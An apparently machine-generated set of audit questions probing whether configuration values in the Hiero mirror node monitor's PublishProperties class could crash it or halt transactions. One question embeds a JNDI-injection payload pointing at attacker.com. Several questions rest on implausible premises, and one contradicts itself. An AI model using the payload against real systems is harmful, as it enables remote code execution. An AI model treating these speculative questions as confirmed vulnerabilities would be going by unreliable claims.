question: [File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user supply a configuration payload where `scenarios` is populated but all entries have blank keys (e.g., `' '`), causing `validate()` to throw `IllegalArgumentException` at `@PostConstruct`, crashing the monitor service on startup and preventing any transaction publishing from ever beginning, resulting in total network transaction confirmation shutdown?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user inject a scenario map key consisting entirely of Unicode whitespace characters (e.g., `\\u00A0`, `\\u2003`) that `StringUtils.isBlank()` does not detect as blank, bypassing the blank-key check in `validate()` and registering a scenario with an invisible name that silently corrupts scenario routing, causing all transactions to be dispatched to an unresolvable scenario and halting confirmation?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user submit a configuration where `enabled=true` and `scenarios` is empty, triggering the `IllegalArgumentException` in `validate()` on every restart attempt, making the monitor permanently unbootable and preventing any new transaction from being submitted to the network?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user craft a scenario name that is exactly one null byte (`\\u0000`), which `StringUtils.isBlank()` treats as non-blank, bypassing the blank-name guard in `validate()` and causing downstream scenario lookup failures that prevent all transactions from being confirmed?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user trigger a repeated application restart loop by injecting a configuration that alternates between `enabled=true`/empty-scenarios and `enabled=false`/populated-scenarios, causing `validate()` to throw on every enabled=true boot cycle and permanently preventing the monitor from reaching a running state where it can confirm transactions?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user supply a `scenarios` map with a very large number of entries (e.g., 100,000 scenario keys), causing `validate()` to iterate over all keys via `scenarios.keySet().stream().anyMatch(StringUtils::isBlank)` and `scenarios.forEach(...)`, consuming enough CPU/memory during `@PostConstruct` to cause an OOM or startup timeout, preventing the monitor from ever confirming transactions?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user inject a scenario name that is a very long string (e.g., 10 MB), causing `StringUtils.isBlank()` and `property.setName(name)` in `validate()` to allocate excessive heap memory during `@PostConstruct`, triggering an OOM that crashes the monitor and halts all transaction publishing?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user exploit the fact that `validate()` calls `scenarios.forEach((name, property) -> property.setName(name))` without synchronization, and if the `scenarios` LinkedHashMap is concurrently modified during `@PostConstruct` (e.g., via a Spring refresh event), cause a `ConcurrentModificationException` that aborts startup and prevents transaction confirmation?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user supply a `scenarios` map where a `PublishScenarioProperties` value is `null`, causing `property.setName(name)` inside `validate()`'s `scenarios.forEach(...)` to throw a `NullPointerException` that propagates out of `@PostConstruct`, crashing the application context and preventing any transaction from being published?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: validate()] Can an unprivileged external user craft a scenario key that passes `StringUtils.isBlank()` but contains path-traversal or JNDI-injection sequences (e.g., `${jndi:ldap://attacker.com/x}`), which are then stored as the scenario name via `property.setName(name)` and later evaluated in a logging or metrics context, causing a remote code execution that shuts down the monitor and halts transaction confirmation?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (batchDivisor)] Can an unprivileged external user set `batchDivisor` to exactly its minimum allowed value of `100`, causing the batch size calculation (total/batchDivisor) to produce a very large batch when total transaction count is high, overwhelming the network nodes with oversized batches and preventing them from confirming new transactions?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (batchDivisor)] Can an unprivileged external user set `batchDivisor` to `Integer.MAX_VALUE` (2147483647), causing the computed batch size to round down to zero or one, effectively serializing all transaction submissions into single-item batches and creating a throughput bottleneck that prevents the network from confirming transactions at any meaningful rate?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (clients)] Can an unprivileged external user set `clients` to `Integer.MAX_VALUE`, causing the monitor to attempt spawning an unbounded number of gRPC/SDK client connections to network nodes, exhausting file descriptors and connection pool resources on both the monitor and the target nodes, preventing any new transaction from being submitted or confirmed?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (clients)] Can an unprivileged external user set `clients=1` (the minimum allowed by `@Min(1)`) while simultaneously setting a very high `tps` in a scenario, causing a single client to be overwhelmed with transaction submission requests, creating a queue backlog that causes all transactions to time out and none to be confirmed by the network?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (responseThreads)] Can an unprivileged external user set `responseThreads` to `Integer.MAX_VALUE`, causing the monitor to attempt creating a thread pool with an astronomically large number of threads, triggering an OOM or OS thread limit error that crashes the monitor process and prevents all transaction confirmation?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (responseThreads)] Can an unprivileged external user set `responseThreads=1` (the minimum allowed by `@Min(1)`), creating a single-threaded response handler that becomes a bottleneck when many transactions are submitted concurrently, causing response processing to queue indefinitely and preventing the monitor from detecting or confirming any transaction completion?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (nodeMaxBackoff)] Can an unprivileged external user set `nodeMaxBackoff` to `Duration.ofDays(365)` (a very large value with no upper bound constraint), causing all network nodes to be backed off for up to a year after a single transient error, effectively blacklisting every node and preventing any transaction from being submitted or confirmed for the duration of the backoff?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (nodeMaxBackoff)] Can an unprivileged external user set `nodeMaxBackoff` to `Duration.ZERO` or a near-zero duration, causing the node backoff mechanism to never actually back off, resulting in a tight retry loop that floods all network nodes with repeated failed transaction submissions and prevents legitimate transactions from being confirmed?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (nodeMaxBackoff)] Can an unprivileged external user observe that `nodeMaxBackoff` has no `@DurationMin` or `@DurationMax` constraint (unlike `statusFrequency` and `warmupPeriod`), and set it to `Long.MAX_VALUE` nanoseconds, causing a permanent node blackout where no node is ever selected for transaction submission, resulting in total transaction confirmation failure?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (warmupPeriod)] Can an unprivileged external user set `warmupPeriod` to `Duration.ofDays(365)` (no upper bound constraint exists beyond `@DurationMin(seconds=0)`), causing the monitor to remain in warmup mode for a year and suppress all transaction publishing during that period, resulting in zero transactions being confirmed by the network?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (warmupPeriod)] Can an unprivileged external user set `warmupPeriod` to exactly `Duration.ZERO` (allowed by `@DurationMin(seconds=0)`), bypassing any intended warmup stabilization period and causing the monitor to immediately submit transactions before network nodes are ready, resulting in mass transaction rejections and no confirmations?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (statusFrequency)] Can an unprivileged external user set `statusFrequency` to `Duration.ofMillis(1)` (the minimum allowed by `@DurationMin(seconds=1)` — but note the annotation says seconds=1, so minimum is 1 second; however if the annotation is `@DurationMin(seconds=1)` and user sets exactly 1 second), causing the `@Scheduled` status method to fire every second and generate excessive logging/metric overhead that starves the response thread pool and prevents transaction confirmations?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (statusFrequency)] Can an unprivileged external user set `statusFrequency` to `Duration.ofDays(365)`, causing the scheduled status check to never fire within a normal operational window, preventing the monitor from detecting that all scenarios have stopped running and masking a total transaction confirmation failure?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (async)] Can an unprivileged external user set `async=false`, forcing all transaction submissions to be synchronous and blocking, causing a single slow or unresponsive network node to block the entire publishing pipeline and prevent any subsequent transactions from being submitted or confirmed?

[File: 'File Name: monitor/src/main/java/org/hiero/mirror/monitor/publish/PublishProperties.java -> Scope: Critical: Network not being able to confirm new transactions (total network shutdown)'] [Function: PublishProperties (async)] Can an unprivileged external user set `async=true` combined with `responseThreads=1` and a very high `tps`, causing the single async response thread to be permanently saturated processing backlogged responses, starving the submission pipeline and causing all new transactions to be dropped without confirmation?
